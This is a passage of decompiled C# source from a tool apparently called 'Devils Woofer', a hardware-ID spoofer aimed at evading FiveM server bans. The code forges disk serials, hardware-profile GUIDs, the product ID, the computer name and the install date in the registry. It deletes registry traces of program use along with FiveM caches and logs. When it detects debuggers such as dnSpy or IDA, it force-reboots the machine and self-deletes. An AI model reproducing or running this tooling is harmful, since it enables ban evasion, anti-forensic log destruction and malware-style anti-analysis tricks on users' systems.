				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
				streamWriter.WriteLine("cls");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Spoofed Windows Info!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00006E64 File Offset: 0x00005064
		public static string RandomId(int length)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			string text2 = "";
			Random random = new Random();
			for (int i = 0; i < length; i++)
			{
				text2 += text[random.Next(text.Length)].ToString();
			}
			return text2;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00006EB8 File Offset: 0x000050B8
		public static void Disk()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00002231 File Offset: 0x00000431
		private void ak(object sender, EventArgs e)
		{
			Main.Disk();
			MessageBox.Show("Spoofed Disk!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00007054 File Offset: 0x00005254
		public static string GenerateString(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "ABCDEF0123456789"[Main.random.Next("ABCDEF0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00002249 File Offset: 0x00000449
		private void al(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Spoofed Xbox!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600006A RID: 106 RVA: 0x000070A0 File Offset: 0x000052A0
		public static void SpoofPCName()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x0600006B RID: 107 RVA: 0x000070EC File Offset: 0x000052EC
		private void am(object sender, EventArgs e)
		{
			Main.SpoofPCName();
			DialogResult dialogResult = MessageBox.Show("Name Spoofed, Do you want to restart your PC Now?", "Devils Woofer", MessageBoxButtons.YesNo);
			if (dialogResult == DialogResult.Yes)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00007140 File Offset: 0x00005340
		private static void an()
		{
			try
			{
				Process process = new Process();
				process.StartInfo.Arguments = "netsh advfirewall firewall delete rule name = fivem_b2545_gtaprocess.exe";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
				MessageBox.Show("Enabled");
			}
			catch
			{
				MessageBox.Show("There was an error, try again later", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x000071C8 File Offset: 0x000053C8
		private void ao(object sender, EventArgs e)
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			MessageBox.Show("PrID Changed To: " + Main.CurrentProductID(), "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00007268 File Offset: 0x00005468
		public static string CurrentProductID()
		{
			string text = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
			string text2 = "ProductID";
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
				{
					if (registryKey2 == null)
					{
						throw new KeyNotFoundException(string.Format("Key Not Found: {0}", text));
					}
					object value = registryKey2.GetValue(text2);
					if (value == null)
					{
						throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", text2));
					}
					result = value.ToString();
				}
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x000021CF File Offset: 0x000003CF
		private void ap(object sender, EventArgs e)
		{
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000021CF File Offset: 0x000003CF
		private void aq(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00002266 File Offset: 0x00000466
		private void ar(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/devilwoofer");
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000021CF File Offset: 0x000003CF
		private void @as(object sender, EventArgs e)
		{
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00007318 File Offset: 0x00005518
		public static void InstallDate()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00002273 File Offset: 0x00000473
		private void at(object sender, EventArgs e)
		{
			Main.InstallDate();
			MessageBox.Show("Spoofed Last Logs ", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00007354 File Offset: 0x00005554
		private static void au()
		{
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName2 = Process.GetProcessesByName("ida64");
			if (processesByName2.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName3 = Process.GetProcessesByName("64dbg");
			if (processesByName3.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg");
			if (processesByName4.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName5 = Process.GetProcessesByName("x32dbg");
			if (processesByName5.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
			Process[] processesByName6 = Process.GetProcessesByName("MasterDumper");
			if (processesByName6.Length != 0)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
				Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
				Application.Exit();
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00007588 File Offset: 0x00005788
		private void av(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.bh.Text;
			string path = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.d.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
		}

		// Token: 0x06000077 RID: 119 RVA: 0x000021CF File Offset: 0x000003CF
		private void aw(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000078 RID: 120 RVA: 0x0000228D File Offset: 0x0000048D
		private void ax(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Unlinked All Services!", "Devils Woofer Premium", MessageBoxButtons.OK);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x000077B0 File Offset: 0x000059B0
		private void ay(object sender, EventArgs e)
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
			foreach (string str in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
			{
				Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + str, true).SetValue("Identifier", Main.RandomId(8) + "-" + Main.RandomId(8) + "-A");
			}
			MessageBox.Show("Spoofed Nvme Disk!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x000022AA File Offset: 0x000004AA
		private void az(object sender, EventArgs e)
		{
			Main.NetWoof();
			Thread.Sleep(2500);
			MessageBox.Show("Spoofed Local netCache!", "Devils Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600007B RID: 123 RVA: 0x0000795C File Offset: 0x00005B5C
		private void ba(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			Main.NetWoof();
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text = this.bh.Text;
			string path = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text2 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				this.d.Add(process);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process.Start();
				MessageBox.Show("Spoofed NVME Disk!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			else
			{
				Thread.Sleep(500);
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path);
			}
			Main.HWIDclick();
			string path2 = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text4 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine("netsh int ip reset");
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.d.Add(process3);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process3.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
			Thread.Sleep(2000);
			MessageBox.Show("Spoofed FiveM Server Bans, Use new steam, rockstar and unlink discord (might need a vpn)", "Devils Woofer Premium", MessageBoxButtons.OK);
		}

		// Token: 0x0600007C RID: 124 RVA: 0x000022CC File Offset: 0x000004CC
		private void bb(object sender, EventArgs e)
		{
			this.ay.BringToFront();
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00007C5C File Offset: 0x00005E5C
		private void bc(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\leanuser.txt"))
			{
				File.Delete("C:\\Program Files\\leanuser.txt");
			}
			if (File.Exists("C:\\Program Files\\leanpass.txt"))
			{
				File.Delete("C:\\Program Files\\leanpass.txt");
			}
			MessageBox.Show("Deleted Saved Logins!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x000022CC File Offset: 0x000004CC
		private void bd(object sender, EventArgs e)
		{
			this.ay.BringToFront();
		}

		// Token: 0x0600007F RID: 127 RVA: 0x000021CF File Offset: 0x000003CF
		private void be(object sender, EventArgs e)
		{
		}

		// Token: 0x06000080 RID: 128 RVA: 0x000022D9 File Offset: 0x000004D9
		private void bf(object sender, EventArgs e)
		{
			Thread.Sleep(2500);
			MessageBox.Show("Boosted Your System!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000081 RID: 129 RVA: 0x000021CF File Offset: 0x000003CF
		private void bg(object sender, EventArgs e)
		{
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000021CF File Offset: 0x000003CF
		private void bh(object sender, EventArgs e)
		{
		}

		// Token: 0x06000083 RID: 131 RVA: 0x00007CA8 File Offset: 0x00005EA8
		public static void NetWoof()
		{
			List<Process> list = new List<Process>();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
				Thread.Sleep(500);
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00007D74 File Offset: 0x00005F74
		public static void HWIDclick()
		{
			string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			string text = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
			string value = string.Concat(new string[]
			{
				"{LeanOnTop-",
				Main.GenID(5),
				"-",
				Main.GenID(5),
				"-",
				Main.GenID(4),
				"-",
				Main.GenID(9),
				"}"
			});
			Registry.SetValue(keyName, "GUID", value);
			Registry.SetValue(keyName, "HwProfileGuid", value);
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00007318 File Offset: 0x00005518
		public static void XBOXclick()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00007E10 File Offset: 0x00006010
		public static void IDclick()
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
		}

		// Token: 0x06000087 RID: 135 RVA: 0x000070A0 File Offset: 0x000052A0
		public static void PCclick()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00007E94 File Offset: 0x00006094
		public static void Diskclick()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
		}

